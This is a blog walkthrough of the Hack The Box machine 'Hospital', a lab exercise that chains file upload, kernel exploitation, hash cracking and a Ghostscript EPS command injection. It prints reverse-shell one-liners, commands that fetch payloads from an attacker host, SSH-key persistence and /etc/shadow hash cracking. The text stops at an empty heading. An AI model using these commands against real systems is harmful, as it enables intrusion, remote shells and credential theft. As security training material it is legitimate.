---
layout: post
title: Hospital
date: 2024-04-08 10:14:00-0400
description: Hospital - Hack The Box walkthrough.
tags: medium-box HTB insecure-file-upload weak-credentials unpatched command-injection remote-code-execution insecure-coding inappropriate-file-permissions local-administrator phar php eps
categories: HTB-Machines
thumbnail: /assets/img/2024-hospital/hospital-logo.png
giscus_comments: false
related_posts: true
toc:
  sidebar: left
featured: false

---

# Introduction

Hospital is rated as a medium difficulty Windows machine. The kill chain was extensive. After registering a fraudulent account on a web frontend, an Insecure File Upload vulnerability that exploited to upload a malicious filetype, leading to  initial access on a Linux webserver.

An unpatched vulnerability in the Linux kernel was then exploited elevate privileges and steal hashes. Cracking the hashes led to unauthorised access of a business email account. The use of unpatched software was then exploited to breakout of the Linux webserver and obtain a shell on a Windows machine.

From there, insecure coding practices had hardcoded a password in a batch script. The presence of a local administrator account and inappropriate file permissions resulted in obtaining `NT Authority` system access.

The machine clearly demonstrates how various vulnerabilities can be chained together to ultimately become greater than the sum of their parts. 

---

## Vulnerabilities explored

#### Insecure File Upload
Allows attackers to upload malicious files to a server, which can lead to unauthorised access or code execution. Mitigation involves strict validation of file types, sizes, and content, alongside implementing secure upload directories.

#### Weak credentials
Use of easily guessed or default credentials, making unauthorised access simpler. Mitigation includes enforcing strong password policies and educating users about secure password practices.

#### Unpatched Operating systems
Exploits known vulnerabilities in outdated operating systems; in this case, the Linux kernel. Regularly updating and patching operating systems and software mitigates this.

#### Command injections
Occurs when an application passes unsafe user-supplied data to a system shell. Mitigation involves validating and sanitising all user inputs and using secure coding practices to avoid execution of untrusted commands.

#### Remote code execution 
Allows an attacker to execute arbitrary code on a victim's system. Mitigation strategies include keeping software up to date, employing least privilege principles, and using firewalls and intrusion detection/prevention systems.

#### Insecure coding
Vulnerabilities introduced by errors or poor practices in software development. Mitigation involves using secure coding practices, regular code reviews, and automated security scanning.

Improperly configured file or directory permissions that give unauthorised access. Regular audits and correctly setting permissions based on the principle of least privilege and separation of duties can mitigate this.

#### Local administrator accounts
Local accounts with high privileges not being properly managed or disabled. Best practices include disabling unnecessary accounts and using centralised authentication methods like Active Directory and LAPS.

## Tools

- <a href="https://github.com/nmap/nmap">Nmap</a>
- Dirsearch
- Burpsuite
- [PHP WebShell](https://github.com/flozz/p0wny-shell/tree/master)
- [Linux Kernel exploit for initial privilege escalation](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
- Hashcat for password cracking
- [CVE-2023-36664  exploit for command injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) 
- Evil-winrm

## Tactics and Methods

#### Exploiting insecure code
- **File Upload**: Utilised to upload a `.phar` file, exploiting insecure file upload handling.
- **Hardcoded Password**: Identified in a batch script, demonstrating insecure coding practices.

#### Stealing hashes and exploiting weak credentials
- **Hash Stealing**: Stole system hashes from the `/etc/shadow` file.
- **Weak credentials:** Cracking them to revealed weak credentials.

#### Business email compromise
- **Email Compromise**: Achieved by exploiting weak credentials to access Dr. Williams' email, illustrating the danger of weak passwords and the effectiveness of password cracking.

#### Exploiting unpatched vulnerabilities
- **Linux Kernel Exploit (CVE-2023-2640-CVE-2023-32629)**: Leveraged to gain elevated privileges through an unpatched kernel vulnerability.
- **Command Injection (CVE-2023-36664)**: Used to inject and execute malicious commands in GhostScript, demonstrating the risk of unpatched software.

#### Establishing persistence
- **Malicious SSH Keys**: Added to ensure persistent access, highlighting the importance of securing authentication mechanisms.

#### Exploiting folder permissions and local administrator account
- **Inappropriate Permissions**: Exploited to achieve `NT Authority` system access, underscoring the need for proper file and directory permission settings.
- **Local Admin Account**: Utilised to grab the root flag to demonstrate access, showcasing the risks associated with not disabling unnecessary administrator accounts.

# Enumeration

## Nmap scanning
As always, we begin with an nmap scan.

```bash
nmap -A -v 10.129.8.141 | tee nmap-output.txt   
```


***A note on `-A`***

- *`-A` is a comprehensive scan. It stands for "aggressive scan" and combines several advanced scanning features in one command. Specifically, it enables OS detection (`-O`), version detection (`-sV`), script scanning (`-sC`), and  traceroute (`--traceroute`).* 
- *When you use `-A`, `nmap` not only performs a script scan with the default scripts (as `-sC` does) but also tries to identify the operating system of the target, determine service/version information more aggressively, and maps out the path packets take to the host.*
- *Using `-A` is a good choice when you want a comprehensive overview of the target, but it's more intrusive and might be detected more easily by intrusion detection systems (IDS) than using `-sC` alone. Always ensure you have authorization to perform such scans on the network you're investigating.*
</small>


```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 04:09 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating Ping Scan at 04:09
Scanning 10.129.82.144 [2 ports]
Completed Ping Scan at 04:09, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:09
Completed Parallel DNS resolution of 1 host. at 04:09, 0.00s elapsed
Initiating Connect Scan at 04:09
Scanning 10.129.82.144 [1000 ports]
Discovered open port 3389/tcp on 10.129.82.144
Discovered open port 22/tcp on 10.129.82.144
Discovered open port 139/tcp on 10.129.82.144
Discovered open port 445/tcp on 10.129.82.144
Discovered open port 8080/tcp on 10.129.82.144
Discovered open port 135/tcp on 10.129.82.144
Discovered open port 443/tcp on 10.129.82.144
Discovered open port 53/tcp on 10.129.82.144
Discovered open port 3269/tcp on 10.129.82.144
Discovered open port 593/tcp on 10.129.82.144
Discovered open port 88/tcp on 10.129.82.144
Discovered open port 464/tcp on 10.129.82.144
Discovered open port 2107/tcp on 10.129.82.144
Discovered open port 2103/tcp on 10.129.82.144
Discovered open port 3268/tcp on 10.129.82.144
Discovered open port 389/tcp on 10.129.82.144
Discovered open port 636/tcp on 10.129.82.144
Discovered open port 1801/tcp on 10.129.82.144
Discovered open port 2179/tcp on 10.129.82.144
Discovered open port 2105/tcp on 10.129.82.144
Completed Connect Scan at 04:10, 31.97s elapsed (1000 total ports)
Initiating Service scan at 04:10
Scanning 20 services on 10.129.82.144
Completed Service scan at 04:11, 64.47s elapsed (20 services on 1 host)
NSE: Script scanning 10.129.82.144.
Initiating NSE at 04:11
Completed NSE at 04:12, 42.19s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 5.80s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Nmap scan report for 10.129.82.144
Host is up (0.32s latency).
Not shown: 980 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-03-19 15:10:36Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-18T15:06:28
| Not valid after:  2024-09-17T15:06:28
| MD5:   f596:b381:3127:b856:8368:11d2:c493:ebad
|_SHA-1: 9445:fdff:334c:4ad8:2560:bdcc:4665:a871:ec50:4d6b
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-19T15:11:35+00:00
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   date: 2024-03-19T15:11:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.01 seconds

```

### Findings
The scan returned an extensive list of possibilities. At first glance items of interest are:

1. **Mixed Operating Systems**: The service information suggests a mixture of Linux and Windows operating systems. This is indicated by the presence of OpenSSH running on Ubuntu and various Microsoft services such as Active Directory LDAP, Windows RPC, and Terminal Services. This could the use of a Windows Subsystem for Linux.
       
2. **Domain and Active Directory Services**: The presence of services such as LDAP (ports 389, 636, 3268, 3269) with references to a domain (`hospital.htb`), Microsoft Windows Active Directory, and Kerberos (port 88) suggest that the target is functioning as a domain controller within a Windows Active Directory environment. This could provide avenues for exploiting attack vectors relating to domain-level vulnerabilities or misconfigurations.
    
3. **Web Services**: Ports 443 and 8080 are running web services (Apache httpd) with SSL, where port 443's service is identified as a webmail system for "Hospital Webmail". The presence of a login page on port 8080 (`login.php`) suggests a potential target for web-based attacks, such as SQL injection, brute-force login, or exploiting web application vulnerabilities.
    
4. **Potential Entry Points**: The open ports 22 (SSH) and 3389 (RDP) are traditional entry points for accessing a system. The reported versions may be worth exploring for known vulnerabilities as a means to gain initial access. More likely, however, is they could be used after stealing credentials from elsewhere.

5. **Service Versions and Vulnerabilities**: The  version information for several services, such as OpenSSH 9.0p1 on Ubuntu and Apache httpd 2.4.56 on Windows is worth checking for known vulnerabilities.
    
6. **Network Service Protocols**: The open ports associated with Microsoft-specific services (e.g., netbios-ssn on port 139, microsoft-ds on 445, ncacn_http on 593) hint at possible SMB or RPC vulnerabilities that could be exploited for lateral movement or privilege escalation within the network.

## Domain enumeration

Next, the domain is enumerated. First we add it to the hosts file to make it accessible.

```bash
echo "10.129.82.144 hospital.htb" | sudo tee -a /etc/hosts
```

Navigating to Port `8080` reveals a logon page, and a link to register an account.

<img src="/assets/img/2024-hospital/landing-page.png" alt="landing-page.png" class="auto-resize">

There is no validation on account registration, so a fraudulent account is created.
<img src="/assets/img/2024-hospital/registration-page.png" alt="registration-page.png" class="auto-resize">

Logging in with the account, and a page is presented to upload medical records, suggesting the presence of a file upload vulnerability.

<img src="/assets/img/2024-hospital/file-upload-page.png" alt="file-upload-page.png" class="auto-resize">

# File upload enumeration
To begin, a test.jpg file is created and the results monitored in Burpsuite.

```bash
──(kali㉿kali)-[~/Documents/htb-machines/hospital/exploits]
└─$ touch test.jpg && echo test > test.jpg
```

Burpsuite confirms the file was uploaded successfully.

<img src="/assets/img/2024-hospital/jpg-file-upload success.png" alt="jpg-file-upload success.png" class="auto-resize">

Given the backend appears to be `PHP`, a `PHP` file is tried next.

<img src="/assets/img/2024-hospital/php-file-test.png" alt="php-file-test.png" class="auto-resize">

It appears `PHP` files are disallowed. In this instance, a `PHAR` file can be tried.

><small>
> *A PHAR (PHP Archive) file is a packaging format for PHP applications, enabling entire PHP applications, including their supporting files, to be distributed and executed as a single archive file. Introduced in PHP 5.3, PHAR files are conceptually similar to Java's JAR files, providing a way to distribute and deploy PHP applications easily.*
>
>*PHAR files can contain PHP code, HTML, images, and other resources needed by the application. They are designed to simplify deployment: instead of dealing with many files and directories, you only need to manage one PHAR file. This makes it easier to distribute, install, and update complex PHP applications.*
</small>

```
┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/exploits]
└─$ touch test.phar && echo test > test.phar
```

<img src="/assets/img/2024-hospital/phar-file-test.png" alt="phar-file-test.png" class="auto-resize">

***A note of .phar files***
- The `PHAR` file works, indicating an Insecure File Upload vulnerability due to insecure coding where the potentially malicious file extension has not been disallowed.
- To exploit this, a `phar` based shell can be crafted and uploaded. Navigating to the file will execute the payload. So understanding where the files upload to is required.
- Browsing to the `/uploads` directory seems to indicate that location does not exist. Further directory enumeration is required to validate how the file upload vulnerability can be successfully exploited.

<img src="/assets/img/2024-hospital/uploads-404.png" alt="uploads-404.png" class="auto-resize">

## Directory enumeration

Dirsearch can be used to enumerate the directories.

```
(kali㉿kali)-[~/Documents/htb-machines/hospital/scans]
└─$ dirsearch -u http://hospital.htb:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/htb-machines/hospital/scans/reports/http_hospital.htb/_24-04-07_20-12-41.txt

Target: http://hospital.htb/

[20:12:41] Starting:

```

The results differ from browser, showing a **301 Moved Permanently** and a **403 forbidden** status codes for `http://hospital.htb:8080/uploads/.

<img src="/assets/img/2024-hospital/uploads-redirect.png" alt="uploads-redirect.png" class="auto-resize">

# Exploitation

Given the uploads folder is not directly accessible, trying to access the file directly rather than traversing the folder structure may work.

Uploading a shell with a `.phar` extension appears to work briefly, with the shell  caught for a moment, but then dropped. Browsing to the malicious file, an error message appears.

<img src="/assets/img/2024-hospital/dropped-shell.png" alt="dropped-shell.png" class="auto-resize">

Attempting a webshell is more successful, but command results are not returned and the attempts begin to return a 404 status code, indicating the file is no longer present.

<img src="/assets/img/2024-hospital/web-shell-fail.png" alt="web-shell-fail.png" class="auto-resize">

Trying the initial shell again now also returns a 404 code, which may indicate some sort of time-based file process mechanism.

<img src="/assets/img/2024-hospital/404-rev-shell.png" alt="404-rev-shell.png" class="auto-resize">

Returning tot he webshell responses, and attempting to redirecting them by  forwarding it back to the terminal also fails.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.2 4321 >/tmp/f
```

Trying the command encoded in base-64 and url-encoding also fails. This indicates the problem is likely with the websehll itself.

Trying a new shell from [flozz](https://github.com/flozz/p0wny-shell/tree/master) is successful and a working webshell is obtained.

<img src="/assets/img/2024-hospital/webshell-success.png" alt="webshell-success.png" class="auto-resize">

Forwarding it back to the terminal is also successful.

<img src="/assets/img/2024-hospital/forward-webshell.png" alt="forward-webshell.png" class="auto-resize">

To stabilise the shell we can use the following command combination.

<img src="/assets/img/2024-hospital/stabilise-shell.png" alt="stabilise-shell.png" class="auto-resize">

- **`python3 -c 'import pty;pty.spawn("/bin/bash")'`**:
    - Launches a new Bash shell within a pseudo-terminal (PTY) session.
    - Improves interaction with the shell (e.g., supports auto-completion, history).
    - Makes the shell behave more like a local terminal.

- **`export TERM=xterm`**:
    - Sets the terminal type to `xterm`, which is widely compatible and supports advanced features.
    - Ensures that the terminal emulation behaves consistently.
    - Enables colour support, cursor movement, and screen clearing commands.

- **`stty raw -echo`**:
    - Sets the terminal to raw mode, sending characters directly without processing.
    - Disables local echo, preventing typed characters from being displayed twice.
    - Ensures that input and output are sent and received as intended, without automatic newline handling or echoing.

- **`fg`**:
    - Brings the most recent background job (your shell) to the foreground.
    - Necessary if the shell was backgrounded, especially after changing terminal settings.
    - May require hitting Enter to see the prompt after execution.

After the last step hit return a few times to return the prompt.

Looking in the `/uploads` file, there are no files, so regaining a shell may be difficult.

# Establishing Persistence
To avoid having to re-do the initial steps in the event of a disconnected shell, malicious SSH keys can be placed on the target.

First, the `~/.ssh` directory is created, and appropriate write permissions confirmed..

```bash
www-data@webserver:/var/www/html$ ls -la ~/.ssh
ls: cannot access '/var/www/.ssh': No such file or directory
www-data@webserver:/var/www/html$ mkdir ~/.ssh
www-data@webserver:/var/www/html$ touch ~/.ssh/test && echo "write access confirmed" || echo "no write access"
write access confirmed
www-data@webserver:/var/www/html$ rm ~/.ssh/test

```

Then an SSH key pair is generated on the local machine.

```bash
┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/persistence]
└─$ ssh-keygen -t rsa -b 2048 -f ctf_key
```

- `-t rsa`: Specifies the type of key to create, in this case, RSA.
- `-b 2048`: Specifies the number of bits in the key, in this case, 2048 bits.
- `-f ~/.ssh/ctf_key`: Specifies the filename of the key; replace `ctf_key` with a name that makes sense for your situation.

The public key is then displayed.

```bash
┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/persistence]
└─$ cat ctf_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn96sRU5Epi8/8T<SNIP>
```

On the target system , the malicious public key is appended to the `~/.ssh/authorized_keys` file. 

```bash
www-data@webserver:/var/www/html$ nano ~/.ssh/authorized_keys
www-data@webserver:/var/www/html$ cat ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn<SNIP>
www-data@webserver:/var/www/html$
```

Now if the shell is dropped, it may be possible to easily regain access using SSH

```bash
┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/persistence]
└─$ ssh -i ~/Documents/htb-machines/hospital/persistence/ctf_key www-data@hospital.htb
```

# System enumeration

Checking sudo permissions for the `www-data` account requires a password. 

```bash 
www-data@webserver:/var/www/html$ sudo -l
[sudo] password for www-data:
```

However, a review of the Linux kernel version reveals an unpatched vulnerbaility. 

```bash
www-data@webserver:/var/www/html$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

# Privilege escalation

Searching the linux kernel version reveals a potential privilege escalation vulnerability as described [here](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

The vulnerability is easily exploited by downloading the exploit, serving it and retrieving it on the target machine. 

```bash
┌──(kali㉿kali)-[~/…/htb-machines/hospital/exploits/CVE-2023-2640-CVE-2023-32629]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.129.229.189 - - [07/Apr/2024 21:54:22] "GET /exploit.sh HTTP/1.1" 200 -
```


```bash
www-data@webserver:/var/www/html$ wget 10.10.14.2:80/exploit.sh
--2024-04-08 08:54:18--  http://10.10.14.2/exploit.sh
Connecting to 10.10.14.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh          100%[===================>]     558  --.-KB/s    in 0s

2024-04-08 08:54:19 (95.0 MB/s) - ‘exploit.sh’ saved [558/558]

www-data@webserver:/var/www/html$
```

Running the exploit, returns a root shell.

```bash
www-data@webserver:/var/www/html$ bash exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@webserver:/var/www/html#

```

> ***Now would be a good time to create persistence with the root user.***

# Lateral movement

## Stealing and cracking hashes

Looking at `/etc/shadow`, there is a hash for the `root` and `drwilliams` accounts.

<img src="/assets/img/2024-hospital/hashes-found.png" alt="hashes-found.png" class="auto-resize">

Stealing the hashes and running them through Hashcat cracks the `drwilliams` one.

```bash
┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/credentials]
└─$ hashcat hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
$6$uWBSeTcoXXT<SNIP>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
Time.Started.....: Sun Apr  7 22:04:47 2024 (1 min, 3 secs)
Time.Estimated...: Sun Apr  7 22:05:50 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3366 H/s (3.58ms) @ Accel:1024 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 215040/14344385 (1.50%)
Rejected.........: 0/215040 (0.00%)
Restore.Point....: 214016/14344385 (1.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: raycharles -> pakimo
Hardware.Mon.#1..: Util: 93%

Started: Sun Apr  7 22:04:28 2024
Stopped: Sun Apr  7 22:05:52 2024
```

## Business email compromise

Now with Dr. William's  credentials, other services can be explored revealed in the initial scan, such as a webmail service running on Port 443. 

<img src="/assets/img/2024-hospital/webservice.png" alt="webservice.png" class="auto-resize">

Trying Dr. Williams' credentials is successful and access is obtained to the email account.

An email in the inbox hints at another potential vector.

<img src="/assets/img/2024-hospital/email.png" alt="email.png" class="auto-resize">

## Windows movement

A google for `GhostScript` and `.eps` reveals another potential vector in the form of a remote code execution via a command injection.

- [jakabakos/CVE-2023-36664-Ghostscript-command-injection: Ghostscript command injection vulnerability PoC (CVE-2023-36664) (github.com)](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)

It seems the vector is to create a payload that exploited the vulnerability in the GhostScript software, and send it back to Dr. Brown to move over to that user's machine..

The payload is crafted by creating a malicious `.eps` file and appending a command to it. This appears to be a method that will break out into the Windows layer, as presumably Dr. Brown will read the email and open the file on a Windows machine.

Proceeding with this theory, the Windows version of Netcat (`nc64.exe`) is required, and palced in the same directory as the exploit. A payload is created that retrieves the `nc64.exe` from a webserver

```bash
┌──(kali㉿kali)-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.2:8000/nc64.exe -o nc.exe" --filename new-design.eps
[+] Payload successfully injected into new-design.eps.
```

The binary is then served and the malicious file sent back to Dr. Brown.

<img src="/assets/img/2024-hospital/Send-netcat.png" alt="Send-netcat.png" class="auto-resize">

A few moments later, the `nc64.exe` binary was successfully retrieved from the server, indicating Dr. Brown has opened the malicious `.eps` file.

```bash
┌──(kali㉿kali)-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.189 - - [07/Apr/2024 22:36:03] "GET /nc64.exe HTTP/1.1" 200 -
```

A  second payload is now crafted that will make use of the `nc64.exe` binary, and establish a reverse shell.

```bash
┌──(kali㉿kali)-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.2 1234 -e cmd.exe" --filename file.eps
[+] Payload successfully injected into file.eps.
```

The second payload is sent via email as well.

<img src="/assets/img/2024-hospital/email-payload.png" alt="email-payload.png" class="auto-resize">

Then, a reverse shell is successfully caught, providing access to Dr. Brown's Windows machine.

```bash
┌──(kali㉿kali)-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.229.189] 25203
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\drbrown.HOSPITAL\Documents>whoami
whoami
hospital\drbrown

C:\Users\drbrown.HOSPITAL\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\drbrown.HOSPITAL\Documents

04/08/2024  05:28 AM    <DIR>          .
04/08/2024  05:28 AM    <DIR>          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File(s)         45,645 bytes
               2 Dir(s)   4,082,790,400 bytes free

C:\Users\drbrown.HOSPITAL\Documents>

```

The user flag is found.

```bash
C:\Users\drbrown.HOSPITAL>cd Desktop
cd Desktop

C:\Users\drbrown.HOSPITAL\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\drbrown.HOSPITAL\Desktop

10/27/2023  12:24 AM    <DIR>          .
10/27/2023  12:24 AM    <DIR>          ..
04/08/2024  05:18 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,082,765,824 bytes free

C:\Users\drbrown.HOSPITAL\Desktop>cat user.txt
cat user.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\drbrown.HOSPITAL\Desktop>type user.txt
type user.txt
<REDACTED>

```

## Privilege escalation - Windows

On Dr Brown's machine is a bat file.

```bash
C:\Users\drbrown.HOSPITAL\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\drbrown.HOSPITAL\Documents

04/08/2024  05:28 AM    <DIR>          .
04/08/2024  05:28 AM    <DIR>          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File(s)         45,645 bytes
               2 Dir(s)   4,082,753,536 bytes free

```

Reviewing the file reveals a hardcoded password.

```powershell
C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring '<REDACTED>' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"

```

The password can be tried on potential other services; for instance, RPC.

```
Password for [WORKGROUP\drbrown]:
rpcclient $>
```

***A note on RPC***
